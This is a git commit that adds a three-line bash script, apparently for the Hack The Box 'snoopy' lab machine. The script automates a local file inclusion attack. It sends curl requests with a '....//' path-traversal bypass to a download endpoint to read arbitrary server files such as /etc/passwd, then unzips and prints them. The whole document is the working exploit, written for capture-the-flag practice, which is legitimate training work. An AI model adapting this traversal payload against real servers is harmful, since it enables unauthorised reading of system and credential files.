a1f455595817bc09bb0b936e7cff19d713687631
zharsuke <alazharisqi@gmail.com>
2023-11-29 23:07:12 +0700

    feat: add lfi output file and automate scrcipt

---
+++ Machines/hard/snoopy/lfiAutomate.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+# usage: ./lfiAutomate.sh /etc/passwd passwd
+curl http://snoopy.htb/download?file=....//....//....//....//..../$1 -o $2.zip; unzip $2.zip; cat press_package$1; rm $2.zip
